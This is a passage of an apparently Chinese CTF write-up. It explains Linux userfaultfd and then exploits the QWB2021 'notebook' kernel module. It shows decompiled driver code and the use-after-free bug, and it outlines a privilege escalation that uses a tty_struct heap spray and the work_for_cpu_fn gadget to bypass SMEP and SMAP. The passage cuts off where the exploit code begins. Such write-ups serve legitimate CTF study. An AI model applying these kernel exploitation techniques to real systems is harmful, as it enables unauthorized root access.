class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册时要用一个struct uffdio_register结构传递注册信息:</span></span><br><span class="line"><span class="comment">// struct uffdio_range &#123;</span></span><br><span class="line"><span class="comment">// __u64 start;    /* Start of range */</span></span><br><span class="line"><span class="comment">// __u64 len;      /* Length of range (bytes) */</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// struct uffdio_register &#123;</span></span><br><span class="line"><span class="comment">// struct uffdio_range range;</span></span><br><span class="line"><span class="comment">// __u64 mode;     /* Desired mode of operation (input) */</span></span><br><span class="line"><span class="comment">// __u64 ioctls;   /* Available ioctl() operations (output) */</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">addr = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// addr 和 len 分别是我匿名映射返回的地址和长度，赋值到uffdio_register</span></span><br><span class="line">uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line"><span class="comment">// mode 只支持 UFFDIO_REGISTER_MODE_MISSING</span></span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line"><span class="comment">// 用ioctl的UFFDIO_REGISTER注册</span></span><br><span class="line">ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register);</span><br></pre></td></tr></table></figure><h3 id="STEP-3-创建一个处理专用的线程轮询和处理”user-fault”事件"><a href="#STEP-3-创建一个处理专用的线程轮询和处理”user-fault”事件" class="headerlink" title="STEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件"></a>STEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件</h3><p>要使用userfaultfd，需要创建一个处理专用的线程轮询和处理”user-fault”事件。主进程中就要调用pthread_create创建这个自定义的handler线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主进程中调用pthread_create创建一个fault handler线程</span></span><br><span class="line">pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="keyword">void</span> *) uffd);</span><br></pre></td></tr></table></figure><p>一个自定义的线程函数举例如下，这里处理的是一个普通的匿名页用户态缺页，我们要做的是把我们一个已有的一个page大小的buffer内容拷贝到缺页的内存地址处。用到了poll函数轮询uffd，并对轮询到的UFFD_EVENT_PAGEFAULT事件(event)用拷贝(ioctl的UFFDIO_COPY选项)进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">// 轮询uffd读到的信息需要存在一个struct uffd_msg对象中</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="comment">// ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line">      ......</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123; <span class="comment">// 此线程不断进行polling，所以是死循环</span></span><br><span class="line">        <span class="comment">// poll需要我们构造一个struct pollfd对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// 读出user-fault相关信息</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件</span></span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题：QWB2021-notebook"><a href="#例题：QWB2021-notebook" class="headerlink" title="例题：QWB2021-notebook"></a>例题：QWB2021-notebook</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -nographic \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic \</span><br><span class="line">    -device e1000 \</span><br><span class="line">    -smp cores=2,threads=2 \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor /dev/null 2&gt;/dev/null \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>保护开启了smep，smap，kaslr进入系统可以看到还开启了kpti。</p><p>题目就是一个菜单堆题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">mynote_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    userarg notearg; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(file *))_fentry__)(file);</span><br><span class="line">    copy_from_user(&amp;notearg, v3, <span class="number">0x18</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0x100</span> )</span><br><span class="line">        <span class="keyword">return</span> noteadd(notearg.idx, notearg.size, notearg.buf);</span><br><span class="line">    <span class="keyword">if</span> ( cmd &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x64</span> )</span><br><span class="line">            <span class="keyword">return</span> notegift(notearg.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x200</span> )</span><br><span class="line">            <span class="keyword">return</span> notedel(notearg.idx);</span><br><span class="line">        <span class="keyword">if</span> ( cmd == <span class="number">0x300</span> )</span><br><span class="line">            <span class="keyword">return</span> noteedit(notearg.idx, notearg.size, notearg.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;[x] Unknown ioctl cmd!\n&quot;</span>, notearg.size, notearg.buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-100LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteadd</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> size, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v4; <span class="comment">// r13</span></span><br><span class="line">    note *v5; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">size_t</span> v6; <span class="comment">// r14</span></span><br><span class="line">    __int64 v7; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = <span class="number">-1LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Add idx out of range.\n&quot;</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v4 = v3;</span><br><span class="line">        v5 = &amp;notebook[idx];</span><br><span class="line">        raw_read_lock(&amp;lock);</span><br><span class="line">        v6 = v5-&gt;size;</span><br><span class="line">        v5-&gt;size = size;</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0x60</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v5-&gt;size = v6;</span><br><span class="line">            v7 = <span class="number">-2LL</span>;</span><br><span class="line">            printk(<span class="string">&quot;[x] Add size out of range.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">            <span class="keyword">if</span> ( v5-&gt;note )</span><br><span class="line">            &#123;</span><br><span class="line">                v5-&gt;size = v6;</span><br><span class="line">                v7 = <span class="number">-3LL</span>;</span><br><span class="line">                printk(<span class="string">&quot;[x] Add idx is not empty.\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                v5-&gt;note = (<span class="keyword">void</span> *)_kmalloc(size, <span class="number">0x24000C0</span>LL);</span><br><span class="line">                printk(<span class="string">&quot;[+] Add success. %s left a note.\n&quot;</span>, name);</span><br><span class="line">                v7 = <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        raw_read_unlock(&amp;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在create函数里，是首先将对应位置的size放到栈上，随后直接把输入的size放到了储存size的地址，并且接着就是一个copy_from_user。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteedit</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> newsize, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v4; <span class="comment">// r13</span></span><br><span class="line">    note *v5; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// r12</span></span><br><span class="line">    __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">-1LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);</span><br><span class="line">        <span class="keyword">return</span> v8;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v5 = &amp;notebook[idx];</span><br><span class="line">    raw_read_lock(&amp;lock);</span><br><span class="line">    size = v5-&gt;size;</span><br><span class="line">    v5-&gt;size = newsize;</span><br><span class="line">    <span class="keyword">if</span> ( size == newsize )</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> editout;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = (*(__int64 (__fastcall **)(<span class="keyword">void</span> *, <span class="keyword">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v5-&gt;size )</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">        v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> editout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line">    &#123;</span><br><span class="line">        v5-&gt;note = (<span class="keyword">void</span> *)v7;</span><br><span class="line">        v8 = <span class="number">2LL</span>;</span><br><span class="line">        editout:</span><br><span class="line">        raw_read_unlock(&amp;lock);</span><br><span class="line">        printk(<span class="string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> v8;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;[x] Return ptr unvalid.\n&quot;</span>);</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到虽然在create函数存在size的验证，但是在edit函数不存在任何验证，并且一样是在krealloc之后就有一个copy_from_user。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">notegift</span><span class="params">(<span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _fentry__(buf);</span><br><span class="line">    printk(<span class="string">&quot;[*] The notebook needs to be written from beginning to end.\n&quot;</span>);</span><br><span class="line">    copy_to_user(buf, notebook, <span class="number">0x100</span>LL);</span><br><span class="line">    printk(<span class="string">&quot;[*] For this special year, I give you a gift!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">100LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的gift函数就是把所有堆地址给泄露出来。</p><h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a><strong>利用分析</strong></h4><p>那么就上面分析出来的结果可以得出目前的利用思路就是，首先利用userfaultfd机制形成一个UAF的堆块，然后利用结构中含有指针的结构体进行堆喷，那么我们就可以进一步的泄漏出地址出来。下一步就是我们可以修改指针进行栈迁移，我们可以把ROP链写在另外一个堆上面，因为可以泄露堆地址的缘故所以我们可以直接栈迁移到写了ROP链的堆上面。这里使用的结构体是tty_struct，其中有tty_operations是一个类似于vtable的函数表，所以我们利用三个堆块即可完成利用。</p><p>上面是常规思路，这里主要写一下新的思路。</p><p>内核中存在这样一个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(<span class="keyword">void</span> *);</span><br><span class="line">    <span class="keyword">void</span> *arg;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, struct work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面函数在编译过后表达的形式其实是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(<span class="keyword">size_t</span> * args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    args[<span class="number">6</span>] = ((<span class="keyword">size_t</span> (*) (<span class="keyword">size_t</span>)) (args[<span class="number">4</span>](args[<span class="number">5</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。</p><p>所以这里只需要用到两个堆块，第一个堆块我们要形成一个size为0x2e0的UAF堆块，第二个堆块没有要求。使用堆喷让tty_struct喷到我们的UAF堆块，但是我们需要确认他是否成功了，在tty_struct的第一个成员是一个魔数，我们可以利用他进行判断。随后修改tty_operations指针指向另外一个堆块，紧接着根据上面的函数中的偏移修改tty_struct的内容即可</p><h4 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 